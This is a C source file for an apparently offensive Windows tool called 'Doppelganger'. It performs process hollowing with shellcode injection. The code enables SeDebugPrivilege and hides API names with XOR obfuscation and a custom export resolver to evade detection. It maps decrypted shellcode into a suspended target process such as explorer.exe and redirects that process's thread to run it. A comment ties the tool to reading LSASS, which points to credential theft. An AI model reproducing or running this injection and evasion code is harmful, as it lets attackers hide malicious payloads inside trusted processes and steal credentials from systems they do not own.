/*
    Author: vari.sh
    Description:
       - This program implements process hollowing (it creates a suspended process,
         injects a deobfuscated shellcode via XOR, and then resumes the thread).

    Usage: Doppelganger.exe "C:\windows\explorer.exe"

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>


// =====================================================
// API Deobfuscation Functions (XOR)
// =====================================================

// Function to decrypt a string (encrypted data is not null-terminated)
char* xor_decrypt_string(const unsigned char* cipher, size_t len, const char* key, size_t key_len)
{
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;
    for (size_t i = 0; i < len; i++) {
        result[i] = cipher[i] ^ key[i % key_len];
    }
    result[len] = '\0';
    return result;
}

// Function to decrypt a buffer in-place (e.g., for shellcode)
void xor_decrypt_buffer(unsigned char* buffer, size_t len, const char* key, size_t key_len)
{
    for (size_t i = 0; i < len; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

// "CreateProcessW"
static const unsigned char CPW_ENC[] = {
    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x66, 0x45, 0x57, 0x5A, 0x04, 0x11, 0x10, 0x33
};

// "ResumeThread"
static const unsigned char RT_ENC[] = {
    0x62, 0x54, 0x41, 0x46, 0x59, 0x50, 0x62, 0x5F, 0x4A, 0x5C, 0x00, 0x06
};

// "NtCreateSection"
static const unsigned char NTCS_ENC[] = {
    0x7E, 0x45, 0x71, 0x41, 0x51, 0x54, 0x42, 0x52, 0x6B, 0x5C, 0x02, 0x16, 0x0A, 0x0B, 0x0B
};

// "NtMapViewOfSection"
static const unsigned char NTMVS_ENC[] = {
    0x7E, 0x45, 0x7F, 0x52, 0x44, 0x63, 0x5F, 0x52, 0x4F, 0x76, 0x07, 0x31, 0x06, 0x07, 0x11, 0x0F, 0x08, 0x06
};

// to_wide util function

wchar_t* to_wide(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len == 0) return NULL;
    wchar_t* wstr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
    return wstr;
}

// =====================================================
// Function to load clean versions of DLLs
// =====================================================
HMODULE LoadCleanDLL(char* dllPath) {

    HMODULE hDLL = LoadLibraryA(dllPath);
    if (hDLL)
    {
        printf("[+] Loaded clean copy of %s at: %p\n", dllPath, hDLL);
    }
    else
    {
        printf("[ERROR] Failed to load %s. Error: %lu\n", dllPath, GetLastError());
    }

    return hDLL;
}

// =====================================================
// get_proc_address reimplementation
// =====================================================

FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    if (hModule == NULL || lpProcName == NULL) {
        printf("Invalid module handle or function name.\n");
        return NULL;
    }

    // Get the base address of the module
    BYTE* baseAddr = (BYTE*)hModule;

    // Validate the DOS header
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS signature.\n");
        return NULL;
    }

    // Retrieve the NT headers using the DOS header's e_lfanew field
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT signature.\n");
        return NULL;
    }

    // Get the Export Directory from the Data Directory
    IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDataDir.VirtualAddress == 0) {
        printf("[!] No export directory found.\n");
        return NULL;
    }

    // Get a pointer to the Export Directory
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(baseAddr + exportDataDir.VirtualAddress);

    // Get pointers to the arrays of function addresses, names and name ordinals
    DWORD* addressOfFunctions = (DWORD*)(baseAddr + exportDir->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)(baseAddr + exportDir->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)(baseAddr + exportDir->AddressOfNameOrdinals);

    // Iterate through the exported names to find the desired function
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)(baseAddr + addressOfNames[i]);
        if (_stricmp(functionName, lpProcName) == 0) {
            // Retrieve the ordinal for the found function
            WORD ordinal = addressOfNameOrdinals[i];
            // Get the RVA of the function
            DWORD functionRVA = addressOfFunctions[ordinal];
            printf("[+] Found %s at ordinal %hu, RVA: 0x%08X\n", lpProcName, ordinal, functionRVA);
            // Return the absolute address of the function
            return (FARPROC)(baseAddr + functionRVA);
        }
    }

    printf("[!] Function %s not found.\n", lpProcName);
    return NULL;
}


// =====================================================
// Main – Process Hollowing + LSASS EPROCESS Reading
// =====================================================
int main(int argc, char* argv[]) {
    // Start
    printf("[+] Starting Doppelganger\n");

    // Enabling SeDebugPrivilege
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    printf("[*] Requesting SeDebugPrivilege...\n");
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken failed, error: %lu\n", GetLastError());
        return 1;
    }
    if (!LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid)) {
        printf("[!] LookupPrivilegeValue failed, error: %lu\n", GetLastError());
        return 1;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges->Luid = luid;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges failed, error: %lu\n", GetLastError());
        return 1;
    }
    if (GetLastError() != ERROR_SUCCESS) {
        printf("[!] AdjustTokenPrivileges reported an error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled.\n");

    // Load clean versions of DLLs
    char* kernel32Path = "C:\\Windows\\System32\\kernel32.dll";
    HANDLE hKernel32 = LoadCleanDLL(kernel32Path);

    char* ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    HANDLE hNtdll = LoadCleanDLL(ntdllPath);

    // Define API functions

    typedef BOOL(WINAPI* PFN_CPW)(
        LPCWSTR lpApplicationName,
        LPWSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCWSTR lpCurrentDirectory,
        LPSTARTUPINFOW lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
        );

    typedef DWORD(WINAPI* PFN_RT)(
        HANDLE hThread
        );

    typedef NTSTATUS(NTAPI* PFN_NtCreateSection)(
        PHANDLE SectionHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        PLARGE_INTEGER MaximumSize,
        ULONG SectionPageProtection,
        ULONG AllocationAttributes,
        HANDLE FileHandle
        );

    typedef NTSTATUS(NTAPI* PFN_NtMapViewOfSection)(
        HANDLE SectionHandle,
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG ZeroBits,
        SIZE_T CommitSize,
        PLARGE_INTEGER SectionOffset,
        PSIZE_T ViewSize,
        DWORD InheritDisposition,
        ULONG AllocationType,
        ULONG Win32Protect
        );

    // XOR key definition
    const char* XOR_KEY = "0123456789abcdefghij";
    size_t key_len = strlen(XOR_KEY);

    // deXORing names
    char* strCPW = (char*)malloc(sizeof(CPW_ENC));
    char* strRT = (char*)malloc(sizeof(RT_ENC));
    char* strNTCS = (char*)malloc(sizeof(NTCS_ENC));
    char* strNTMVS = (char*)malloc(sizeof(NTMVS_ENC));

    if (!strCPW || !strRT || !strNTCS || !strNTMVS) {
        printf("[ERROR] Memory allocation error\n");
        return 1;
    }
    memcpy(strCPW, CPW_ENC, sizeof(CPW_ENC));
    memcpy(strRT, RT_ENC, sizeof(RT_ENC));
    memcpy(strNTCS, NTCS_ENC, sizeof(NTCS_ENC));
    memcpy(strNTMVS, NTMVS_ENC, sizeof(NTMVS_ENC));

    strCPW = xor_decrypt_string((unsigned char*)strCPW, sizeof(CPW_ENC), XOR_KEY, key_len);
    PFN_CPW pCPW = (PFN_CPW)CustomGetProcAddress(hKernel32, strCPW);
    SecureZeroMemory(strCPW, sizeof(CPW_ENC));

    strRT = xor_decrypt_string((unsigned char*)strRT, sizeof(RT_ENC), XOR_KEY, key_len);
    PFN_RT  pRT = (PFN_RT)CustomGetProcAddress(hKernel32, strRT);
    SecureZeroMemory(strRT, sizeof(RT_ENC));

    strNTCS = xor_decrypt_string(NTCS_ENC, sizeof(NTCS_ENC), XOR_KEY, key_len);
    PFN_NtCreateSection pNCS = (PFN_NtCreateSection)CustomGetProcAddress(hNtdll, strNTCS);
    SecureZeroMemory(strNTCS, sizeof(strNTCS));
    
    strNTMVS = xor_decrypt_string(NTMVS_ENC, sizeof(NTMVS_ENC), XOR_KEY, key_len);
    PFN_NtMapViewOfSection pNMVOS = (PFN_NtMapViewOfSection)CustomGetProcAddress(hNtdll, strNTMVS);
    SecureZeroMemory(strNTMVS, sizeof(strNTMVS));

    if (!pCPW || !pRT || !pNCS || !pNMVOS) {
        printf("[ERROR] Error retrieving API addresses.\n");
        return 1;
    }
    free(strCPW); free(strRT); free(strNTCS); free(strNTMVS);

    // Obtain the target executable path (from command line or stdin)
    char exePathA[MAX_PATH] = { 0 };
    if (argc > 1) {
        strncpy(exePathA, argv[1], MAX_PATH - 1);
        printf("[+] Path provided from command line: %s\n", exePathA);
    }
    else {
        printf("[*] Enter the full path of the executable: ");
        if (!fgets(exePathA, sizeof(exePathA), stdin)) {
            printf("[ERROR] Error reading the path.\n");
            return 1;
        }
        exePathA[strcspn(exePathA, "\r\n")] = '\0';
    }
    if (strlen(exePathA) == 0) {
        printf("[ERROR] Invalid path!\n");
        return 1;
    }
    wchar_t* exePathW = to_wide(exePathA);
    if (!exePathW) {
        printf("[ERROR] Error converting the path to Unicode.\n");
        return 1;
    }

    // Create the process in a suspended state

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!pCPW(exePathW, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[ERROR] Error creating the process, code: %lu\n", GetLastError());
        free(exePathW);
        return 1;
    }
    free(exePathW);
    printf("[+] Process created in suspended state, PID: %lu\n", pi.dwProcessId);

    // Deobfuscate the shellcode
    unsigned char shellcode_enc[] = {
        0xD8, 0xF1, 0x41, 0x33, ...
    };
    size_t shellcode_len = sizeof(shellcode_enc);
    xor_decrypt_buffer(shellcode_enc, shellcode_len, XOR_KEY, key_len);

    // Create section
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = { 0 };
    sectionSize.QuadPart = shellcode_len;
    NTSTATUS status = pNCS(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0 || !hSection) {
        printf("[ERROR] NtCreateSection failed: 0x%08X\n", status);
            return 1;
    }

    // Map section to local process
    PVOID localBaseAddress = NULL;
    SIZE_T viewSize = 0;
    status = pNMVOS(hSection, GetCurrentProcess(), &localBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
    if (status != 0 || !localBaseAddress) {
        printf("[ERROR] NtMapViewOfSection (local) failed: 0x%08X\n", status);
            return 1;
    }
    memcpy(localBaseAddress, shellcode_enc, shellcode_len);

    // Map section to remote process
    PVOID remoteBaseAddress = NULL;
    viewSize = 0;
    status = pNMVOS(hSection, pi.hProcess, &remoteBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
    if (status != 0 || !remoteBaseAddress) {
        printf("[ERROR] NtMapViewOfSection (remote) failed: 0x%08X\n", status);
            return 1;
    }
    printf("[+] Shellcode mapped at remote address: %p\n", remoteBaseAddress);

    // Modify RIP to point to shellcode in remote process
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[ERROR] GetThreadContext failed: %lu\n", GetLastError());
            return 1;
    }
#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteBaseAddress;
#else
    ctx.Eip = (DWORD)remoteBaseAddress;
#endif
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[ERROR] SetThreadContext failed: %lu\n", GetLastError());
            return 1;
    }

    DWORD suspendCount = pRT(pi.hThread);
    printf("[+] Thread resumed, suspend count: %lu\n", suspendCount);

    // Cleanup: close handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("[+] Operation completed.\n");
    return 0;
}
